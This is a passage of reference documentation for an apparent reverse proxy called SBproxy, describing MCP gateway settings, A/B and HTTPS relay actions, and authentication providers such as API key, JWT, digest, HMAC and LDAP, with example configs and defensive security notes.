| `approval` | object | unset | Gateway-originated hold for high-risk `tools/call`. `store` is an owner-only JSON file. `hold_ttl` defaults to `15m`. `webhook` is optional and SSRF-checked at compile. `tools[]` entries prefer `digest` (rename-proof); `name` is a trailing-`*` glob and is the weaker form. The caller's HTTP connection is never held open: the gateway returns JSON-RPC `-32097` with `hold_id` / `snapshot` / `expires_at`. A console page is deferred; operators use `GET`/`POST /api/mcp/approvals`. TrueFoundry is the surveyed SOTA for this gate. |
| `argument_policies` | list | `[]` | CEL or OPA-compatible Rego rules evaluated against the tool-call context (name, server, session, tenant, principal, parsed arguments) after RBAC and JSON-Schema validation, before dispatch. `mode: warn` (default) or `block`. |
| `result_policies` | list | `[]` | Same CEL/Rego shape as `argument_policies`, evaluated against the tool-call result after dispatch and after `content_filters`, before the result reaches the caller. |
| `content_filters` | object | `{secrets: off, pii: off}` | Secret- and PII-shape detection over tool-call arguments and results, `resources/read`, and `prompts/get` responses. Each of `secrets` / `pii` is `off` \| `warn` \| `redact` \| `block`. |
| `flow` | object | `{mode: off}` | Deterministic session-flow enforcement (Meta's Rule of Two): `mode` (`off`/`warn`/`block`), `rule` (`two_of_three`/`taint_and_outbound`), `trusted_servers`, `sensitive_servers`, `sensitive_tools`, `outbound_tools`, `taint_reads`. |
| `mcp_audit` | object | `{capture_arguments: false}` | Opt-in redacted, size-bounded verbatim tool-call arguments on `mcp_governance_decision` evidence records. |
| `egress` | object | allow all | Default egress policy for OpenAPI-backed REST tools, and, per server, the base MCP connect too. A server-level `egress` block overrides it. |
| `guardrails` | list | `[]` | Tool allowlist and lethal-trifecta checks applied before `tools/call`. |
| `progressive_discovery` | bool | false | Advertise `search` and `execute` meta-tools instead of the full catalog. |
| `oauth` | object | unset | RFC 9728 protected-resource discovery metadata. |
| `refresh_interval` | duration | `60s` | Upstream tool and resource catalog refresh cadence. |
| `upstream_connect_timeout` | duration | `5s` | TCP connection deadline for upstream exchanges. |
| `upstream_timeout` | duration | `30s` | Whole-request deadline for upstream exchanges. |
| `max_upstream_response_bytes` | int | 8 MiB | Maximum response body buffered from one upstream exchange. |
| `tool_versioning` | object | unset | Optional lockfile, version-bump checks, judges, and rollout controls. |
| `sessions` | object | unset | Optional `Mcp-Session-Id` lifecycle management. |
| `token_compaction` | object | unset | Optional compaction for verbose tool-result text blocks. |
| `dual_llm_quarantine` | object | unset | Optional LLM review gate for suspicious tool output. |
| `tool_pricing` | map | `{}` | USD price per advertised tool name for cost attribution. |
| `usage_sinks` | list | `[]` | JSONL, webhook, ledger, Langfuse, or Datadog tool-usage destinations. |
| `cedar_policies` | object | unset | Optional Cedar ABAC set compiled at config load and installed as a built-in MCP `tools/call` hook. `policies` is the Cedar source (required). `schema_override` appends workspace schema that must not collide with the default MCP schema. Match `principal == Agent::"<id>"` (or `Agent::"anonymous"`); `principal in AgentClass::"..."` never matches because the hook evaluates against an empty entity store. Confirm-annotated forbids refuse with `confirmation required: …` unless `approval:` is also set, in which case the call is parked (JSON-RPC `-32097`) until an operator approves the content snapshot. Does not run on `type: local` tools. See [cedar-policy.md](cedar-policy.md). |

See [mcp.md](mcp.md) for federation, RBAC, OpenAPI-backed tools, sessions,
versioning, and cost attribution, and [mcp-compose.md](mcp-compose.md) for
`type: local` servers: config-declared tools, HTTP and step-DAG handlers,
and response shaping.

### abtest

([config](../examples/ab-test-routing/))

Split traffic across weighted backend variants for an A/B test. A request
that arrives without the sticky cookie takes a weighted pick and the
response hands the client its pin; a returning client carrying that cookie
stays on the same variant, so a multi-request user journey never sees a
different variant mid-flight.

```yaml
origins:
  "app.example.com":
    action:
      type: abtest
      sticky_cookie: sb_ab_variant
      variants:
        - name: control
          url: https://control.internal:8080
          weight: 50
        - name: experiment
          url: https://experiment.internal:8080
          weight: 50
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `variants` | list | required, non-empty | Backend variants. Each entry is `name`, `url`, `weight`. |
| `sticky_cookie` | string | `sb_ab_variant` | Cookie name used to pin a client to its assigned variant across requests. |

A request that arrives without the cookie takes a weighted roll, and the
response carries `Set-Cookie: <sticky_cookie>=<variant>; Path=/;
Max-Age=2592000; SameSite=Lax; HttpOnly` so the next request from that
client reaches the same variant. A request that already carries the
cookie is routed by it and is not restamped, so the thirty-day window
counts from the first visit rather than sliding forward on every
request. The value is the variant name from your own config; nothing the
caller sent is written into it.

A cookie naming a variant that has since been removed from `variants`
falls through to a fresh roll, so shrinking an experiment does not strand
the clients pinned to the variant you dropped.

A request carrying the sticky cookie with a value matching a configured
variant's `name` always routes to that variant. Everything else gets a
fresh weighted-random pick: a variant's share of traffic is its `weight`
divided by the sum of all weights, and a total weight of `0` (every
variant weighted `0`) falls back to the first configured variant rather
than dividing by zero. Do not set the sticky cookie from your
application as well: the proxy already stamps it, and a second
`Set-Cookie` with the same name leaves it to the browser which one wins.
If the backend needs to know which variant served a request, read it from
the cookie the proxy set rather than minting your own.

`abtest` cannot be combined with `response_cache` on the same origin, and
the config is refused at load if you try. That holds whether the `abtest`
is the origin's own action or sits in one of its `forward_rules` entries,
because the parent origin's cache is consulted before a rule is selected
either way. The cache lookup runs before the variant is picked, and the
variant is not part of the cache key, so a cache hit would serve one
variant's body to clients assigned another and the split would report
weights it never applied. Disable `response_cache` on this origin, or put
the cached content on its own.

Each variant's `url` accepts the same host **and path** as a `proxy`
action: `https://b.example.com/v2` sends the request to `/v2` prefixed
onto the client's own path, exactly as a `proxy` action with that URL
would. `host_override`, `retry`, and `service_discovery` are not
supported on a per-variant basis.

Every request that reaches this action **and resolves to a usable
upstream** records
`sbproxy_action_abtest_variant_selected_total{origin, variant}`, whether
the pick came from the sticky cookie or a fresh roll, so the observed
ratio between variants reflects the configured weights over time (absent
a skew in how often sticky-cookie holders return). A request whose
selected variant has a `url` that does not parse is refused with `502`
and is not counted, so a gap between this counter and the origin's
request count is a malformed variant URL rather than a routing bug.

### https_proxy

([config](../examples/https-forward-proxy/))

Relay a request to the host it already resolved to (the inbound `Host`
header), but only when that host is on an explicit allow-list. Where every
other action in this section proxies to a URL fixed in config, this one
has no `url` field at all: think of it as a narrower version of `proxy`
for an origin whose hostname key is a wildcard (`"*.internal.io"`) and
that wants to relay only a named subset of the hosts the wildcard would
otherwise match, refusing the rest with `403` instead of quietly
forwarding them.

```yaml
origins:
  "*.internal.io":
    action:
      type: https_proxy
      allowed_hosts:
        - api.internal.io
        - "*.svc.internal.io"
      require_auth: true
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `allowed_hosts` | list | required, non-empty | Hosts permitted through the relay. Exact match or a `*.suffix` wildcard. |
| `connect_timeout_ms` | int | `5000` | Upstream connect timeout applied to the relayed connection. |
| `require_auth` | bool | `false` | When true, the origin must also configure an `authentication:` provider; a request with no successful `Allow` decision is refused with `401` regardless of `allowed_hosts`. |

This is a guarded TLS reverse-proxy action, not an HTTP `CONNECT` tunnel: it
forwards the HTTP request to the resolved host over TLS on port `443` and
cannot create a raw byte tunnel. The relay is always HTTPS to port `443` on the resolved host, with the
inbound request forwarded otherwise unchanged (no `Host` rewrite, matching
the source concept this ports: the destination is whatever host the
client asked for, not a URL the operator configured). A denied host gets
`403`; every decision, allowed or denied, records
`sbproxy_action_https_proxy_decisions_total{origin, decision}` so a
sustained run of `deny` is visible before it is mistaken for the relay
being broken.

### noop

Return `200 OK` with an empty body. The action accepts no fields beyond
`type` and is useful for health fixtures and policy-only origins.

```yaml
origins:
  "noop.example.com":
    action:
      type: noop
```

---

## Authentication

The `authentication` block is a sibling of `action`, not nested inside it. It controls who can access the origin. SBproxy ships fifteen built-in auth providers: `api_key`, `basic_auth`, `bearer`, `jwt`, `digest`, `hmac_auth`, `ldap_auth`, `forward_auth`, `ext_authz`, `oauth_introspection`, `kya`, `bot_auth`, `cap`, `oidc`, and `noop`.

`bot_auth` verifies cryptographically-signed AI agents per RFC 9421 + the IETF Web Bot Auth draft. Full reference: [web-bot-auth.md](web-bot-auth.md).

Anything else falls through to the inventory-based auth plugin registry, so a linked third-party crate can register additional types (`oauth`, `oauth_introspection`, `oauth_client_credentials`, `ext_authz`, `biscuit`, `saml`, ...) without patching the proxy. Plugins register on the typed `AuthPluginRegistration` channel and surface through the standard `authentication.type` config field.

### Unknown keys are refused

Every one of the fourteen configurable built-in providers refuses a key it
does not recognize, at `serve`, `validate`, and hot reload. The error names
the key you wrote and lists the ones the provider accepts:

```
unknown field `require_dp0p`, expected `tokens` or `require_dpop`
```

This closes a fail-open. Until it landed, an unrecognized key was dropped
silently and the setting it was meant to be took its default, so
`require_dp0p: true` on a bearer block served every request with DPoP
proof-of-possession off while the config read as though it were on. The
same held for `require_mtls_bound` on `jwt`, and for every other optional
switch on every other provider.

Two things stay open on purpose. `noop` has no configuration to check, so a
stray key on a `noop` block is still accepted. And the per-credential
entries inside `api_keys:`, `tokens:`, `users:`, and `hmac_auth`'s `keys:`
stay permissive, because each one flattens the free-form attribution
metadata (`project`, `team`, `tags`, ...) into the same mapping and there is
no way to tell an unknown key from an intended one there.

Upgrading: a config that carried a stray key inside an `authentication`
block used to boot and now fails to compile. See
[config-stability.md](config-stability.md#unknown-keys-inside-an-authentication-block).

### Accepting more than one provider

`authentication` also takes a list of two or more provider blocks. Providers run in declared order and the first one that accepts the request wins. This is the shape of a credential migration (keep accepting legacy API keys while callers move to JWTs on the same origin) and of mixed-client origins (services present tokens, crawlers present signatures).

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      - type: api_key
        api_keys:
          - ${LEGACY_API_KEY}
      - type: jwt
        jwks_url: https://auth.example.com/.well-known/jwks.json
        issuer: https://auth.example.com
```

How the list behaves:

- Order matters. Put the provider most callers use first; every request walks the list from the top and stops at the first success.
- The winner binds the request. Audit events, decision records, and the auth metric name the provider that authenticated the request, and principal attribution (project, user, team, `key_id`) comes from the winning entry's own config. Nothing is merged across providers.
- When every provider rejects, the response carries the first provider's status and message, with each provider's `WWW-Authenticate` challenge merged onto it ([RFC 7235](https://www.rfc-editor.org/rfc/rfc7235) permits several challenges on one response). A client that failed both then sees every scheme the origin accepts.
- A provider that fails, whatever the reason, loses only its own slot. The next provider still runs, and a request no provider accepts is rejected.
- A one-entry list is refused at config load; write a single provider as a plain mapping.
- Three types are refused inside a list. `noop` would admit every request and make the other entries decorative. `forward_auth` runs as a separate subrequest and only works as an origin's sole provider. `oidc` needs the login-callback endpoint that only a sole `oidc` block wires up.

The list, as a loop:

```mermaid
flowchart TD
    R["Request reaches the origin's\nauthentication list"] --> T["Try the next entry\nin declared order"]
    T -->|"rejects, entries remain"| T
    T -->|accepts| W["First success wins: that entry binds\nattribution, audit events, decision\nrecords, and the auth metric"]
    T -->|"rejects, list exhausted"| D["Denied: the first entry's status and message,\nall WWW-Authenticate challenges\nmerged on (RFC 7235)"]
```

See [examples/auth-composition/](../examples/auth-composition/) for a runnable two-provider config.

### api_key

Authenticate requests with an API key. Keys are checked in the `X-Api-Key` header by default; an optional `query_param` lets clients pass keys via the URL. Typical fit: machine-to-machine API access.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      type: api_key
      api_keys:
        - ${API_KEY_1}
        - ${API_KEY_2}
      query_param: api_key
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `api_key` |
| `api_keys` | list | required | Accepted API keys |
| `header_name` | string | `X-Api-Key` | Header carrying the API key |
| `query_param` | string | | When set, keys can be supplied via the named URL query parameter |

Test with:
```bash
curl -H "Host: api.example.com" -H "X-Api-Key: your-key-here" http://localhost:8080/
```

### basic_auth

HTTP Basic Authentication with username/password pairs. Fits simple internal services and admin panels.

```yaml
origins:
  "admin.example.com":
    action:
      type: proxy
      url: https://admin-backend.internal:8080
    authentication:
      type: basic_auth
      users:
        - username: admin
          password: ${ADMIN_PASSWORD}
        - username: readonly
          password: ${READONLY_PASSWORD}
      realm: "Admin Panel"
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `basic_auth` |
| `users` | list | required | Username/password pairs |
| `realm` | string | `restricted` | Realm sent in the `WWW-Authenticate` challenge on a 401 |

A denied request gets the challenge, which is what makes a browser
prompt and tells a scripted client which scheme to retry with:

```bash
$ curl -i -H 'Host: admin.example.com' http://localhost:8080/
HTTP/1.1 401 Unauthorized
content-type: application/json
content-length: 24
www-authenticate: Basic realm="Admin Panel"

{"error":"unauthorized"}
```

Both the missing-credential and the wrong-password cases challenge.
`realm` is optional in config only; RFC 9110 section 11.6.1 requires the
parameter on the wire, so an origin that sets none is challenged as
`Basic realm="restricted"`. A quote or backslash in the realm is escaped
into the quoted string rather than being allowed to end it.

An `error_pages` entry or `problem_details` on the origin replaces the
body above and leaves the challenge header in place.

### bearer

Authenticate with Bearer tokens in the Authorization header. The default for token-based service auth.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      type: bearer
      tokens:
        - ${SERVICE_TOKEN_1}
        - ${SERVICE_TOKEN_2}
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `bearer` |
| `tokens` | list | required | Accepted bearer tokens (each entry is either the raw secret or `{secret, dpop_jkt, ...}`) |
| `require_dpop` | bool | `false` | When `true`, every accepted token MUST come with a valid RFC 9449 DPoP proof whose `jkt` matches the token entry's `dpop_jkt` metadata. Tokens without `dpop_jkt` metadata fail closed. |

Any other key on a `bearer` block is rejected at config load. Misspelling
`require_dpop` used to leave DPoP off silently; see
[Unknown keys are refused](#unknown-keys-are-refused).

#### Sender-constrained Bearer (RFC 9449)

DPoP binds an opaque bearer token to a proof-of-possession key
so a stolen token alone is not enough to access the resource.
The operator stamps the JWK thumbprint of the expected key on
each bearer entry; the proxy reads the `DPoP:` header on every
request and verifies the proof against the stamped thumbprint.

```yaml
authentication:
  type: bearer
  require_dpop: true
  tokens:
    - secret: ${SERVICE_TOKEN_1}
      dpop_jkt: "NzbLsXh8uDCcd-6MNwXF4W_7noWXFZAfHkxZsRGC9Xs"
    - secret: ${SERVICE_TOKEN_2}
      dpop_jkt: "8WGoq1lXk-3z7AIuS-XwSeUGzqQ3LtIMOvbf2bZj0Vk"
```

The `dpop_jkt` value is the RFC 7638 SHA-256 thumbprint of the
client's DPoP signing key, base64url-no-pad. Deriving it once
per client is a one-shot operator step (most identity systems
publish it alongside the client's other registration data).

### jwt

Validate JSON Web Tokens. Supports JWKS endpoints for key rotation and claims validation. Pick this for OAuth2/OIDC-protected APIs.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      type: jwt
      jwks_url: https://auth.example.com/.well-known/jwks.json
      issuer: https://auth.example.com
      audience: my-api
      algorithms: [RS256]
      required_claims:
        scope: api:read
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `jwt` |
| `secret` | string | | HMAC signing secret (HS256/HS384/HS512) |
| `jwks_url` | string | | URL to fetch JWKS from (RS / ES / PS family) |
| `issuer` | string | | Required `iss` claim value |
| `audience` | string | | Required `aud` claim value |
| `algorithms` | list | inferred | Allowed signing algorithms. Defaults to HS256/HS384/HS512 with `secret`, RS256 with `jwks_url`. |
| `required_claims` | map | | Claims that must be present and equal to the configured value. |
| `require_dpop` | bool | `false` | When `true`, the JWT MUST come with a valid RFC 9449 DPoP proof whose `jkt` matches the token's `cnf.jkt` claim. Tokens without a `cnf.jkt` claim fail closed. |
| `require_mtls_bound` | bool | `false` | When `true`, the JWT's `cnf.x5t#S256` claim MUST match the SHA-256 thumbprint of the inbound TLS client cert (RFC 8705 mutual-TLS-bound tokens). |
| `jwe.decryption_key` | string | | PEM private key for decrypting JWE (RFC 7516) encrypted tokens before the usual signature checks. See "Encrypted tokens" below. |

The list must contain at least one entry; an empty list rejects all tokens. Bearer tokens must be supplied via `Authorization: Bearer <jwt>`.

Any other key on a `jwt` block is rejected at config load. Misspelling
`require_dpop` or `require_mtls_bound` used to leave that binding off
silently; see [Unknown keys are refused](#unknown-keys-are-refused).

#### Sender-constrained JWT (RFC 9449 + RFC 8705)

Both `require_dpop` and `require_mtls_bound` may be set together
on the same provider; the request must satisfy BOTH constraints.
The two constraints are independent:

* **DPoP** (RFC 9449) binds the token to a proof-of-possession
  key the client signs with on every request. The token's
  `cnf.jkt` claim is the SHA-256 thumbprint of that key; the
  proxy reads the `DPoP:` header and verifies.
* **mTLS-bound** (RFC 8705) binds the token to the SHA-256
  thumbprint of the TLS client cert the resource server saw
  on the connection. The token's `cnf.x5t#S256` claim carries
  the thumbprint; the proxy compares it against the
  base64url-encoded (no padding) SHA-256 of the DER encoding
  of the client certificate presented on the inbound
  connection.

```yaml
authentication:
  type: jwt
  jwks_url: https://auth.example.com/.well-known/jwks.json
  issuer: https://auth.example.com
  audience: my-api
  require_dpop: true
  require_mtls_bound: true
```

Both flags default to `false` so existing JWT configurations
keep their unbound semantics. Turn them on per-route as the
issuer starts minting `cnf.jkt` / `cnf.x5t#S256` tokens.

#### Encrypted tokens (RFC 7516 JWE)

Some identity providers encrypt their tokens instead of only
signing them: a signed JWT nested inside a JWE envelope. Set
`jwe.decryption_key` to the PEM private key registered with the
issuer and the proxy decrypts the envelope first, then verifies
the recovered JWT with the same `secret` / `jwks_url` settings
as a plain signed token (decrypt-then-verify per RFC 7519). A
provider without a `jwe` block refuses encrypted tokens, so
existing JWS-only configurations are unaffected.

```yaml
authentication:
  type: jwt
  jwks_url: https://auth.example.com/.well-known/jwks.json
  issuer: https://auth.example.com
  audience: my-api
  jwe:
    decryption_key: ${JWT_JWE_PRIVATE_KEY}
```

Supported algorithms are the set enterprise issuers actually
use for encrypted tokens: `RSA-OAEP` and `RSA-OAEP-256` key
unwrap with an RSA private key, and `ECDH-ES` direct key
agreement with a P-256 EC private key, all with `A256GCM`
content encryption. Anything else, including the deprecated
`RSA1_5`, is refused. The refusal is logged at `info`, which
survives the release build, and names the offending algorithm.

Failure handling is deliberately uniform: wrong key, garbage
ciphertext, an unsupported algorithm, or a tampered tag all
produce the same 401 challenge as a bad signature, so a probing
client learns nothing from the response shape. The decryption
key is never echoed in logs or error messages. Interpolate it
from the environment or a secret backend (as above) rather than
committing key material to the config file.

### digest

HTTP Digest Authentication (RFC 7616). The right pick when a legacy system insists on digest auth. The stored `password` is the HA1 hash, `H(username:realm:password)`, not the plaintext password.

`H` is SHA-256 unless you say otherwise. RFC 7616 §3.3 deprecates MD5, so a config that omits `algorithm` challenges with `algorithm=SHA-256` and verifies against SHA-256 HA1 hashes. MD5 stays available for a client or an HA1 table that cannot move, but you have to ask for it.

```yaml
origins:
  "legacy.example.com":
    action:
      type: proxy
      url: https://legacy-backend.internal:8080
    authentication:
      type: digest
      realm: "Legacy"
      users:
        - username: alice
          password: ${ALICE_HA1}
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `digest`. |
| `realm` | string | required | Realm string sent in the `WWW-Authenticate` challenge. |
| `algorithm` | string | `SHA-256` | Digest algorithm. `SHA-256` or `MD5`. Advertised in the challenge and required to match on the response. |
| `users` | list or map | required | Accepted users. Either a list of `{username, password}` objects, or a map of `username: ha1_hex`. |

Compute the HA1 for the algorithm you configured:

```bash
# SHA-256 (the default): 64 hex characters
printf '%s' 'alice:Legacy:s3cret' | shasum -a 256
# MD5 (legacy): 32 hex characters
printf '%s' 'alice:Legacy:s3cret' | md5sum
```

The hash length has to match the algorithm, and config compilation checks it. An MD5-length HA1 left on the SHA-256 default cannot ever produce a matching response, so it is refused at boot instead of turning into a 401 nobody can explain:

```text
digest auth: user "alice" has a 32-character HA1 but `algorithm: SHA-256` needs 64 hex
characters; this is an MD5-length HA1 and `algorithm` now defaults to SHA-256. Recompute it as
SHA-256(username:realm:password), or set `algorithm: MD5` to keep the existing table
```

To keep an existing MD5 deployment working unchanged, add one line:

```yaml
authentication:
  type: digest
  realm: "Legacy"
  algorithm: MD5
  users:
    - username: alice
      password: ${ALICE_MD5_HA1}
```

The algorithm is negotiated, not merely declared. The challenge carries `algorithm=`, and a response that names a different algorithm, or omits the parameter on a SHA-256 realm, is rejected. A client cannot talk a SHA-256 realm down to MD5 by dropping the parameter. Only `SHA-256` and `MD5` are implemented; the `-sess` variants and `SHA-512-256` are refused at config compile rather than silently downgraded.

A runnable SHA-256 challenge, a successful `curl --digest` retry, and a wrong-password 401 are in [`examples/auth-digest/`](../examples/auth-digest/).

### hmac_auth

Signed-request authentication for machine callers. The client holds a shared secret and signs each request with RFC 9421 HTTP Message Signatures (`hmac-sha256`), so no static credential crosses the wire and a captured request cannot be replayed against a different method, path, or time window. The right pick for webhook senders and machine-to-machine API clients that want per-request integrity without a bearer token.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      type: hmac_auth
      clock_skew_seconds: 300
      require_body_digest: true
      nonce_store: memory
      keys:
        - key_id: svc-billing
          secret: ${BILLING_HMAC_SECRET}
          project: billing
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `hmac_auth`. |
| `keys` | list | required | Accepted signing keys, at least one. Each entry needs a unique `key_id` (the RFC 9421 `keyid` the signer advertises) and a `secret`. Entries also accept the per-credential metadata fields (`project`, `user`, `team`, `tags`, `metadata`). |
| `clock_skew_seconds` | int | 300 | Freshness window for the mandatory `created` signature parameter, applied in both directions. A `created` older than the window is refused as a replay; one further in the future is refused as skewed. |
| `required_components` | list | `["@method", "@target-uri"]` | Components every accepted signature must cover. The default binds the verb and the full target URI, so a captured signature cannot be replayed against a different route. Add `content-digest` to bind the request body as well. |
| `require_body_digest` | bool | `false` | When true, a signature that omits `content-digest` on a request that carries a body is refused. A body is detected from Content-Length greater than zero, chunked Transfer-Encoding, a non-empty body the verifier can already see, or (when those headers are absent) any method other than GET, HEAD, OPTIONS, or DELETE. HTTP/2 and HTTP/3 POSTs often omit Content-Length and never use chunked TE; the method fallback is what still requires coverage there. GET and other bodyless requests are not required to cover the digest (the Apache APISIX `hmac-auth` `validate_request_body` precedent). Each key entry may set `require_body_digest` to override this. |
| `nonce_store` | string | unset | Set to `memory` to consume the RFC 9421 `nonce` parameter for exactly-once replay defense inside `clock_skew_seconds`. A wired store requires a nonce and fails closed on a store error. Omit it to keep timestamp-window-only replay defense. Durable backends use the same `NonceStore` trait `bot_auth` uses; this config takes no filesystem path or Redis URL. |

The `secret` resolves through the secret resolver like every other signing-key field: an inline literal, `${VAR}`, `env:NAME`, `file:PATH`, or a backend URI such as `vault://...`. A reference nothing can resolve refuses to boot rather than becoming the key. Verification failures answer `401` with a `WWW-Authenticate: Signature` challenge that carries no key material, and the failure reason is logged, never returned to the client.

A content-digest mismatch after the signature has already verified is recorded as an auth deny, not an allow followed by a later 401, so SIEM and `sbproxy_auth_results_total` see the true outcome. `GET /admin/config/effective` shows the compiled `hmac_auth` block, including these knobs; a dedicated console page is not shipped yet.

Clients send the standard RFC 9421 header pair. The signature base covers the declared components plus the `@signature-params` line, `created` is required, and `alg` must be `hmac-sha256` (the only symmetric algorithm in the RFC 9421 registry; HMAC-SHA1 does not exist here to be negotiated down to):

```text
Signature-Input: sig1=("@method" "@target-uri");created=1723800000;keyid="svc-billing";alg="hmac-sha256"
Signature: sig1=:BASE64_HMAC_SHA256_OF_SIGNATURE_BASE:
```

On a match the principal's `sub` is the `key_id`, `principal_kind` is `hmac_auth`, and the entry's metadata rides along for per-credential reporting.

`@target-uri` is the absolute URI RFC 9421 §2.2.2 defines, scheme and
authority included: `https://api.example.com/v1/orders?page=2`, not
`/v1/orders?page=2`. Sign it the way any conformant RFC 9421 library
does and the proxy reconstructs the same string. Earlier releases
derived the path and query alone; a signature in that older shape is
still accepted for a deprecation window, counted on
`sbproxy_signature_legacy_derivation_total{component}` and logged once
per process with the verifier's key id. `@request-target`, for the same reason, is
the bare request target (`/v1/orders?page=2`) rather than
draft-cavage's `GET /v1/orders?page=2`.

The default components bind the verb and the route, not the body. A signature over `("@method" "@target-uri")` alone says nothing about the bytes that follow it, so a request captured off the wire can be replayed with a different body until its `created` timestamp falls outside `clock_skew_seconds`. Covering `content-digest` is what closes that:

```text
Content-Digest: sha-256=:X48E9qOokqqrvdts8nOJRJN3OWDUoyWxBf7kbu9DBPE=:
Signature-Input: sig1=("@method" "@target-uri" "content-digest");created=1723800000;keyid="svc-billing";alg="hmac-sha256"
Signature: sig1=:BASE64_HMAC_SHA256_OF_SIGNATURE_BASE:
```

The check runs in two steps, because authentication happens before the proxy has read the body. The signature base binds the `Content-Digest` header value; the proxy then buffers the request body, hashes it, and answers `401` if the hash and the header disagree. Put `content-digest` in `required_components` to make that binding mandatory on every request, including bodyless ones. `require_body_digest: true` is the body-aware form (APISIX `validate_request_body`): a header-only signature is refused only when the request carries a body.

Buffering is what makes the second step possible, so a body-covering signature caps the request at the 8 MiB request-body buffer. A larger body answers `413`. Leave `content-digest` out of the covered components for routes that carry more than that, and accept that those routes are not body-bound.

See [`examples/auth-hmac/`](../examples/auth-hmac/) for a complete working config with a signing script.

### forward_auth

Delegate authentication to an external service. SBproxy sends a subrequest to the auth service and uses the response status to allow or deny the original request. The right choice when auth logic lives in its own service.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      type: forward_auth
      url: https://auth.internal/verify
      method: GET
      timeout: 5000
      headers_to_forward: [Authorization, Cookie]
      trust_headers: [X-User-ID, X-User-Email, X-User-Roles]
      success_status: 200
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `forward_auth` |
| `url` | string | required | External auth service URL |
| `method` | string | GET | HTTP method for the subrequest |
| `timeout` | int | | Subrequest timeout in milliseconds |
| `headers_to_forward` | list | | Headers to copy from the original request. Alias: `forward_headers`. |
| `trust_headers` | list | | Headers from the auth response to inject into the upstream request |
| `success_status` | int \| list | 200 | Status code(s) that mean "authenticated". A list is accepted, but only the first element is used. |

### ldap_auth

Authenticate against an LDAP or Active Directory server with a directory bind. The client sends HTTP Basic credentials; the proxy composes a bind DN as `<uid_attribute>=<username>,<base_dn>` and attempts an LDAP simple bind with the supplied password. A successful bind authenticates the request and attributes it to the username. The password is used for the bind only: never stored, never forwarded upstream, never logged. `ldap` is accepted as an alias for the `type` value.

```yaml
origins:
  "intranet.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      type: ldap_auth
      url: ldaps://directory.internal:636
      base_dn: ou=users,dc=example,dc=org
      uid_attribute: uid
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `ldap_auth` (alias: `ldap`) |
| `url` | string | required | Directory URL: `ldap://host[:port]` or `ldaps://host[:port]` |
| `base_dn` | string | required | Base DN the user RDN is appended to, e.g. `ou=users,dc=example,dc=org` |
| `uid_attribute` | string | `cn` | Attribute the username is bound under when composing the DN |
| `use_tls` | bool | `false` | Upgrade an `ldap://` connection with StartTLS before the bind |
| `tls_verify` | bool | `true` | Verify the directory's TLS certificate. When verifying, the `url` host must match the certificate's host. |
| `allow_insecure` | bool | `false` | Accept a plaintext `ldap://` connection with no StartTLS |
| `timeout_secs` | int | 5 | Deadline in seconds for the connect + bind exchange |

Three behaviors are deliberate:

- **Plaintext is refused at config load.** An `ldap://` URL with neither `use_tls: true` nor `allow_insecure: true` fails config validation, because a simple bind sends the password in the clear. TLS (both `ldaps://` and StartTLS) runs on the same rustls stack as the rest of the proxy.
- **Directory unreachable fails closed.** A dial failure, TLS failure, or timeout refuses the request with a `503`; wrong credentials get a `401`. An LDAP outage therefore reads as an outage, and requests are never admitted unchecked.
- **Empty passwords are refused locally.** RFC 4513 defines a name-plus-empty-password simple bind as an *unauthenticated* bind, which many directories answer with success; the proxy refuses it without consulting the directory.

Like `forward_auth`, and unlike the static-credential providers, this dials out on the request hot path. That is a latency cost, and it is also an exposure: authentication runs before an origin's `policies:` are evaluated, so a `rate_limit` or `ddos` policy you write for the origin cannot cap what this provider dials. Without a bound of its own, anyone who can send an `Authorization: Basic` header drives one directory bind per HTTP request, which makes the gateway a 1:1 amplifier pointed at your directory and hands an attacker directory-side account lockout for any username they can guess.

Three bounds run before the dial. None of them caches a success, so none extends a credential's life past a revocation or a password change:

| Bound | Value | What it stops |
|-------|-------|---------------|
| Refused-credential cache | 30s | A credential the directory already refused is refused locally instead of dialing again. Keyed on a salted hash of the exact username and password, so it can match nothing else. |
| Per-username failed-bind budget | 5 failures per 60s, then 1 bind per 12s | A username under password guessing drops from as fast as the attacker can send to the budget's rate. A successful bind clears it. Past the budget the directory is still consulted, just less often, so this slows guessing rather than stopping it. |
| Outbound concurrency cap | 32 binds in flight | A burst cannot hold open an unbounded number of directory connections for `timeout_secs` each. Over the cap, requests are refused as unavailable. |

Only a refusal the directory itself returned spends a budget. An empty password, which is refused locally without dialing, does not.

The budget throttles, it does not block, and that is deliberate. A budget that blocked would let anyone who knows a username spend it with five wrong guesses and have every later request refused, the owner's correct password included, which trades an attack on your directory for an attack on your users. Past the budget a request waits for the next slot instead, and a throttled request answers `503`, not `401`: the proxy has not asked the directory and does not know whether the credential is good, so it does not claim the password was wrong.

Two things these bounds do not do. An attacker who cycles through *distinct* usernames pays one bind per new name, because a per-username budget cannot see across names. And because the throttle still lets failures through at the budget's rate, a determined attacker can still drive a targeted username toward a directory-side lockout, just far more slowly. Neither is fixable here: both need a limit that runs before authentication, which today means a network-level or upstream rate limit in front of the origin. Budget `timeout_secs` for the directory's real latency.

See [examples/auth-ldap/](../examples/auth-ldap/) for a runnable setup, including a local OpenLDAP fixture.

### bot_auth

Verify RFC 9421 HTTP Message Signatures from known agents. Configure an inline
`agents` directory, a hosted `directory`, or both.

```yaml
authentication:
